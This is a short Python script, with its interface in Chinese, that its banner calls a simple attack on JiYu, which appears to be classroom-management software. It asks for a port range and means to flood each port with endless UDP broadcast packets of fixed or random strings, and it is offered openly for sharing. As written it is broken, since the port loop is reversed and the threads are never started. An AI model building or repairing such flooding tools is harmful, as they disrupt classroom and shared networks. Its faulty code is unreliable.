# Copyright (c) wangyupu 2024 - present
# Download python 3.6.5 -> https://www.python.org/downloads/release/python-365/
# File URL: Windows x86-64 executable installer : https://www.python.org/ftp/python/3.6.5/python-3.6.5-amd64.exe

import socket
import threading
import random,string

def broadcastThread(port,message,address='255.255.255.255'):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    while True:
        sock.sendto(message().encode(), (address, port))

def randomString(length): # from ai
    characters = string.ascii_letters + string.digits
    random_str = ''.join(random.choices(characters, k=length))
    return random_str

def randomStringMessageSource():
    return randomString(26)

def simpleMessageSourece():
    return "abcdefghijklmnopqrstuvwxyz"

if __name__ == "__main__":
    print("简易极域攻击 wangyupu-website分享版 版本0")
    portStart = int(input("端口：从:"))
    portEnd = int(input("到:"))
    useRandomString = input("使用随机信息：y/n") == "y"
    # threading
    message = simpleMessageSourece
    if useRandomString: message = randomStringMessageSource
    for port in range(portEnd+1,portStart):
        threading.Thread(target=broadcastThread,name=f"port-{port}",daemon=True,args=(port,message))
    print("完成")

